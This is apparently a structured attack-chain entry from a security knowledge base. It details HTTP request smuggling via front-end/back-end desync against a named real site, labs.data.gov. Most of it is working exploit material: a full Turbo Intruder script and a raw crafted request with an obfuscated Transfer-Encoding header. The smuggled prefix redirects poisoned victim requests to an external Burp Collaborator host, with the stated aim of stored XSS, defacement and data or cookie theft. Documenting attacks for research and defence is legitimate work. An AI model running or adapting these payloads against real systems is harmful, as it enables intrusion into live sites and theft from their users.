---
tags:
  - http-request-smuggling
  - desync
  - xss
  - web-vulnerability
  - stored-xss
type: attack_chain
tools:
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/import-re-module]]'
  - '[[commands/define-queueRequests-function]]'
  - '[[commands/initialize-RequestEngine]]'
  - '[[commands/start-request-engine]]'
  - '[[commands/define-smuggled-prefix]]'
  - '[[commands/calculate-chunk-size]]'
  - '[[commands/build-desync-attack-request]]'
  - '[[commands/extract-content-length]]'
  - '[[commands/adjust-content-length]]'
  - '[[commands/queue-attack-request]]'
  - '[[commands/queue-multiple-normal-requests]]'
  - '[[commands/define-handleResponse-function]]'
  - '[[commands/send-crafted-http-request]]'
platforms:
  - Web
complexity: high
procedures:
  - '[[procedures/Prepare-Turbo-Intruder-Desync-Script]]'
  - '[[procedures/Send-HTTP-Desync-Request]]'
  - '[[procedures/Observe-Poisoned-Request-Interactions]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
description: >-
  Exploits HTTP Request Smuggling on labs.data.gov by desynchronizing front-end
  and back-end request parsing to smuggle malicious requests, leading to stored
  XSS, webpage defacement, and potential theft of user data or cookies.
skill_level: advanced
impact_level: high
id: 2bbcc527-3a24-4857-bbf3-2dc0ac8c9716
created_at: '2025-12-13T09:01:22.507Z'
updated_at: '2025-12-13T09:01:22.507Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
---
# HTTP Request Smuggling via Desync for Stored XSS and Data Theft

Multi-stage attack chain exploiting HTTP Request Smuggling on labs.data.gov due to desynchronization between front-end and back-end servers, allowing smuggling of malicious requests to poison victim sessions and enable stored XSS, defacement, or data theft.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Desync Script] --> B[Send Desync Request]
    B --> C[Observe Poisoned Interactions]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Turbo-Intruder]]
- [[tools/Burp-Suite]]
- [[tools/Burp-Collaborator]]

### Target Environment

- Web platform
- Target URL: https://labs.data.gov
- Tech stack: WordPress with Yoast SEO, The Events Calendar, and Simple Tooltips plugins

### Initial Access Requirements

- Network access to the target URL
- No credentials required
- Burp Suite configured with Turbo Intruder extension

## Detailed Attack Procedures

### Step 1: Prepare Turbo Intruder Script
procedure: [[procedures/Prepare-Turbo-Intruder-Desync-Script]]

**Objective**: Set up a Turbo Intruder script to craft and queue a desync HTTP request that smuggles a malicious POST.

**Instructions**: Import the regex module using [[commands/import-re-module]]:

```python
import re
```

Define the queueRequests function using [[commands/define-queueRequests-function]]:

```python
def queueRequests(target, wordlists):
```

Initialize the RequestEngine with specified parameters using [[commands/initialize-RequestEngine]]:

```python
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=1, resumeSSL=False, timeout=10, pipeline=False, maxRetriesPerRequest=0, engine=Engine.THREADED,)
```

Start the engine using [[commands/start-request-engine]]:

```python
engine.start()
```

Define the smuggled request prefix using [[commands/define-smuggled-prefix]]:

```python
prefix = '''POST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''
```

Calculate the chunk size using [[commands/calculate-chunk-size]]:

```python
chunk_size = hex(len(prefix)).lstrip("0x")
```

Build the desync attack request using [[commands/build-desync-attack-request]]:

```python
attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
```

Extract the Content-Length using [[commands/extract-content-length]]:

```python
content_length = re.search('Content-Length: (\d+)', attack).group(1)
```

Adjust the Content-Length using [[commands/adjust-content-length]]:

```python
attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
```

Queue the attack request using [[commands/queue-attack-request]]:

```python
engine.queue(attack)
```

Queue multiple normal requests using [[commands/queue-multiple-normal-requests]]:

```python
for i in range(14): engine.queue(target.req); time.sleep(0.05)
```

Define the handleResponse function using [[commands/define-handleResponse-function]]:

```python
def handleResponse(req, interesting): table.add(req)
```

**Expected Output**: A prepared script ready to send the desync request.

**Success Indicators**:
- Script executes without errors
- Attack request is modified correctly

### Step 2: Send HTTP Desync Request
procedure: [[procedures/Send-HTTP-Desync-Request]]

**Objective**: Transmit the crafted desync request to exploit the smuggling vulnerability and poison subsequent requests.

**Instructions**: Send the crafted HTTP request using [[commands/send-crafted-http-request]]:

```http
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

**Expected Output**: Server processes the request desynced, leading to poisoning of the next request.

**Success Indicators**:
- Request sent successfully
- No immediate errors from the server

### Step 3: Observe Poisoned Request Interactions
procedure: [[procedures/Observe-Poisoned-Request-Interactions]]

**Objective**: Monitor Burp Collaborator for interactions from poisoned victim requests and verify reflections.

**Instructions**: Check Burp Collaborator for DNS lookups or HTTP requests to the specified domain. Observe the target server's responses for reflections of the Burp Collaborator URL in script tags, links, or other elements.

**Expected Output**: Interactions logged in Burp Collaborator, such as DNS queries or HTTP requests from the poisoned endpoint.

**Success Indicators**:
- Reflections of attacker's domain in victim responses
- Confirmed stored XSS or data exfiltration potential

## Attack Chain Summary

### Key Achievements

1. Successful desynchronization of HTTP request parsing
2. Smuggling of malicious POST request
3. Poisoning of victim requests leading to XSS and data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Adversary-in-the-Middle]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
